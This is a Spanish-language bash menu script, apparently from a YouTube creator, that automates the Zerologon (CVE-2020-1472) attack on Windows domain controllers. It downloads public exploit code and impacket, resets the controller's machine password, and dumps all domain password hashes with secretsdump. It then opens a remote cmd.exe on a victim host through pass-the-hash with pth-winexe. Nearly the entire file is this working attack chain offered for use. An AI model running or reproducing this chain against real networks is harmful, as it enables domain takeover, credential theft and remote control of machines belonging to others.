#!/bin/bash

opcion="ninguna"

function opcion1
{
	git clone https://github.com/SecuraBV/CVE-2020-1472.git
	cd CVE-2020-1472/
	pip3 install -r requirements.txt

	echo ""
	echo "Se intalo Correctamente"
	echo ""
	read -rsp $'Press enter to continue...\n'
}

function opcion2
{

echo ""
echo "*                                                                 *"
echo "* Ingrese la IP del Servidor de Dominio Ejemplo: 192.168.1.100    *"
echo "*                                                                 *"
echo ""
read ipdc

echo ""
echo "*                                                                                                 *"
echo "* Ingrese el nombre del Servidor de Dominio (DC-Name) IP de Red Ejemplo: RAGNAR			  *"
echo "*                                                                                                 *"
echo ""
read nombredc

	echo ""
	python3 zerologon_tester.py $nombredc $ipdc
	echo ""
	read -rsp $'Press enter to continue...\n'

}

function opcion3
{
	git clone https://github.com/pypa/virtualenv.git
	cd virtualenv
	pip3 install virtualenv
	virtualenv zerologon
	source zerologon/bin/activate

	cd ..
	git clone https://github.com/SecureAuthCorp/impacket
	cd impacket/
	python3 setup.py install
	cd ..
	mkdir exploit
	cd exploit
	git clone https://github.com/dirkjanm/CVE-2020-1472.git
        cd CVE-2020-1472
	read -rsp $'Press enter to continue...\n'
}

function opcion4
{
echo ""
echo "*                                                                 *"
echo "* Ingrese la IP del Servidor de Dominio Ejemplo: 192.168.1.100    *"
echo "*                                                                 *"
echo ""
read ipdc

echo ""
echo "*                                                                                                 *"
echo "* Ingrese el nombre del Servidor de Dominio (DC-Name) IP de Red Ejemplo: RAGNAR                   *"
echo "*                                                                                                 *"
echo ""
read nombredc

	echo ""
	cd virtualenv
        virtualenv zerologon
        source zerologon/bin/activate
	cd ..
	cd exploit/CVE-2020-1472
	python3 cve-2020-1472-exploit.py $nombredc $ipdc
	echo ""

	read -rsp $'Press enter to continue...\n'

	echo ""
        echo "Muy bien Ahora que ya vulneramos el DC vamos a dumpear los HASHES del Servior de dominio"
        echo "          	Dame enter para obtener todos los HASHES con Secretsdump 	       "

	echo ""
	echo "*                                                                                          *"
	echo "* Ingrese el nombre del Dominio (DC-Name) IP de Red Ejemplo: evilcorp.local                *"
	echo "*                                                                                          *"
	echo ""
	read dominio

	echo ""
#	secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr' Ejemplo
	secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 $dominio/$nombredc\$@$ipdc

	read -rsp $'Press enter to continue...\n'
}

function opcion5
{

echo ""
echo "*                                                                            *"
echo "* Ingrese el nombre de usuario atacar Ejemplo: Administrador                 *"
echo "*                                                                            *"
echo ""
read user

echo ""
echo "*                                                                         	                 							*"
echo "* Ingrese el HASH del PC al que desea ingresar y obtener un CMD Ejemplo:	edf4a1453b7a69695acc35a98e0ae6f9:7f6dc0cac006c6a0126c233671b7bfaf	*"
echo "*                                                                                 	         							*"
echo ""
read hash

echo ""
echo "*                                                                               *"
echo "* Ingrese la ip victima DC controlador de dominio Ejemplo: 192.168.1.100	*"
echo "*                                                                               *"
echo ""
read ipvictima

pth-winexe -U $dominio/$user%$hash //$ipvictima cmd.exe

}

while [ $opcion != "6"  ]
    do

	#Banner
	echo ""
	echo "		▒███████▒▓█████  ██▀███   ▒█████   ██▓     ▒█████    ▄████  ▒█████   ███▄    █ 	"
	echo "		▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ 	"
	echo "		░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒██░    ▒██░  ██▒▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒	"
	echo "		  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░▒██░    ▒██   ██░░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒	"
	echo "		▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░░██████▒░ ████▓▒░░▒▓███▀▒░ ████▓▒░▒██░   ▓██░	"
	echo "		░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 	"
	echo "		░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░	"
	echo "		░ ░ ░ ░ ░   ░     ░░   ░ ░ ░ ░ ▒    ░ ░   ░ ░ ░ ▒  ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ 	"
	echo "		  ░ ░       ░  ░   ░         ░ ░      ░  ░    ░ ░        ░     ░ ░           ░ 	"
	echo "		░                                                                              	"
	echo ""

	echo "                                                                                                     "
	echo "                                  [Created By Anonimo501]                                            "
	echo "                            [https://youtube.com/c/Anonimo501]                                       "
	echo "                                                                                                     "
	echo "                              Hola bienvenid@s a zerologon                                           "
	echo "                                        	                                                           "
	echo "	ADVERTENCIA: NO ejecute el script si no tiene un backup del DC/AD ya que el ataque puede causar problemas"

	echo -e "\nMenu"
	echo -e "\t1) Descargar Checker (Instalacion de repositoio para ver si en servidor es vulnerable)"
	echo -e "\t2) Ejecucion De Script Checker (Si ya se instalo el Checker ahora ejecutelo con esta opcion para ver si el servidor es vulnerable)"
        echo -e "\t3) Descargar Exploit, virtualenv e impacket"
        echo -e "\t4) Ejecutar Exploit"
        echo -e "\t5) Si ya obtuvimos los hashes con la opcion anterior ejecutame para obtener un CMD en la maquina victima mediante Pass The Hash"
	echo -e "\t6) Salir\n"
	echo -e "\tOpcion: \c"

	read opcion

        if [ -z $opcion ] ; then opcion="ninguna" ; fi

        case $opcion in
		"1" )
                      opcion1
  		      ;;
		"2" )
		      opcion2
		      ;;
                "3" )
                      opcion3
                      ;;
                "4" )
                      opcion4
                      ;;
                "5" )
                      opcion5
                      ;;
		"*" )
		      ;;

	esac


	/usr/bin/clear
done
